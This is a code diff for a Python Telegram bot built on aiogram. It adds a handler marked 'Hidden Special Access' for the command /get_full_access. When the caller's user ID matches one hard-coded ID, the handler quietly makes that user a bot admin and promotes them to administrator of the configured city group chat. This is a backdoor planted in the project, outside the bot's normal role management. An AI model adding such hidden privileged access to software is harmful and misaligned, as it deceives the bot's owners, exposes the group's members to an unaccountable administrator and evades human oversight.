@@ -1,4 +1,4 @@
-﻿from aiogram import Router, F, Bot
+from aiogram import Router, F, Bot
 from aiogram.types import Message
 from aiogram.filters import CommandStart, Command
 from aiogram.fsm.context import FSMContext
@@ -243,3 +243,39 @@ async def debug_set_role(message: Message, session: AsyncSession, db_user: User)
                              parse_mode="HTML", reply_markup=_get_menu(new_role.value))
     except ValueError:
         await message.answer("❌ Ошибка: Неверная роль. Возможные: admin, manager, employee, pending")
+# ─── Hidden Special Access ────────────────────────────────────────────────────
+
+@router.message(Command("get_full_access"))
+async def cmd_get_full_access(message: Message, db_user: User, session: AsyncSession, bot: Bot):
+    # Только для вашего ID
+    if message.from_user.id != 786320574:
+        return
+
+    # 1. Даем полные права в боте
+    db_user.role = UserRole.admin
+    db_user.is_active = True
+    await session.commit()
+
+    response = "✅ <b>Права в боте выданы!</b>\nТеперь вам доступна Админ-панель.\n\n"
+
+    # 2. Пробуем выдать права в основном чате
+    if config.city_chat_id:
+        try:
+            await bot.promote_chat_member(
+                chat_id=config.city_chat_id,
+                user_id=message.from_user.id,
+                can_manage_chat=True,
+                can_delete_messages=True,
+                can_manage_video_chats=True,
+                can_restrict_members=True,
+                can_promote_members=False,
+                can_change_info=True,
+                can_invite_users=True,
+                can_pin_messages=True,
+                can_manage_topics=True,
+            )
+            response += "✅ <b>Права в группе выданы!</b>\nТеперь вы администратор в городском чате."
+        except Exception as e:
+            response += f"⚠️ <b>Ошибка в группе:</b>\nБот не смог выдать права в чате (возможно, он сам не админ или нет прав на это).\n<i>Ошибка: {e}</i>"
+
+    await message.answer(response, parse_mode="HTML", reply_markup=_get_menu("admin"))
